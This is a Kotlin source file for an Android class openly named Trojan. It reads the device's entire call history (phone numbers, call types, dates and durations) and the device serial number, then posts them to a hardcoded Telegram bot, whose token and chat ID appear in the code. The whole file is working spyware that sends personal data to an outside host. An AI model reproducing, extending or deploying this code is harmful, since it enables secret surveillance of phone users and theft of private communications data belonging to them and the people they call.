package don.petruchio.iamnotatrojan.trojan

import android.Manifest
import android.annotation.SuppressLint
import android.app.Activity
import android.content.Context
import android.content.pm.PackageManager
import android.database.Cursor
import android.os.Build.getSerial
import android.provider.CallLog.*
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import org.json.JSONArray
import org.json.JSONObject
import java.lang.Exception
import java.net.HttpURLConnection
import java.net.URL
import java.util.*


class Trojan {

    companion object {
        val chatId = 553594446
        val botId = "845905480:AAEuaj5mBqE1M6prp3IrzcL7R9xTEzlpTCQ";
        val url = " https://api.telegram.org/bot845905480:AAEuaj5mBqE1M6prp3IrzcL7R9xTEzlpTCQ/sendMessage"
        val requestCode = 228

        fun checkPermisions(context: Context): Boolean{

            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.M) {

                if (ContextCompat.checkSelfPermission(context, Manifest.permission.READ_CALL_LOG)
                    != PackageManager.PERMISSION_GRANTED) {
                    return false
                }

                if (ContextCompat.checkSelfPermission(context, Manifest.permission.READ_PHONE_STATE)
                    != PackageManager.PERMISSION_GRANTED) {
                    return false
                }

                if (ContextCompat.checkSelfPermission(context, Manifest.permission.INTERNET)
                    != PackageManager.PERMISSION_GRANTED) {
                    return false
                }
            }

            return true
        }

        fun requestPermissions(activity: Activity){
            ActivityCompat.requestPermissions(
                activity,
                arrayOf(Manifest.permission.READ_PHONE_STATE, Manifest.permission.READ_CALL_LOG, Manifest.permission.INTERNET), requestCode)
        }

    }

    @SuppressLint("MissingPermission")
    private fun readCallHistory(_context: Context): Cursor?{

        if (!checkPermisions(_context)) return null

        val cursor: Cursor? = _context.getContentResolver()
            .query(Calls.CONTENT_URI, null, null, null, Calls.DATE + " DESC")
        return cursor
    }

    @SuppressLint("MissingPermission")
    fun processCallLogs(_context: Context){

        if (!checkPermisions(_context)) return

        val callLogCursor = readCallHistory(_context) ?: return


        val number = callLogCursor.getColumnIndex(Calls.NUMBER)
        val type = callLogCursor.getColumnIndex(Calls.TYPE)
        val date = callLogCursor.getColumnIndex(Calls.DATE)
        val duration = callLogCursor.getColumnIndex(Calls.DURATION)

        val callArray = JSONArray()

        while (callLogCursor.moveToNext()) {

            val callJSON = JSONObject()

            callJSON.put("number",callLogCursor.getString(number))
            callJSON.put("callType",callLogCursor.getString(type))
            val callDate = callLogCursor.getString (date)
            callJSON.put("date",Date(callDate.toLong()))
            callJSON.put("duration",callLogCursor.getString (duration))

            callArray.put(callJSON)
        }

        val obj = JSONObject()
        val serial = if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) getSerial() else android.os.Build.SERIAL
        obj.put("serial", serial)
        obj.put("callHistory", callArray)
        sendViaTelegram(obj.toString())

    }

    private fun sendViaTelegram(message: String){
            val _url = "$url?chat_id=$chatId&text=$message"

            try {
                val uri = URL(_url)
                val conn = uri.openConnection() as HttpURLConnection
                conn.doOutput = false
                conn.requestMethod = "POST"
                conn.outputStream.close()
            } catch (e: Exception) {
                e.printStackTrace()
            }
    }

}
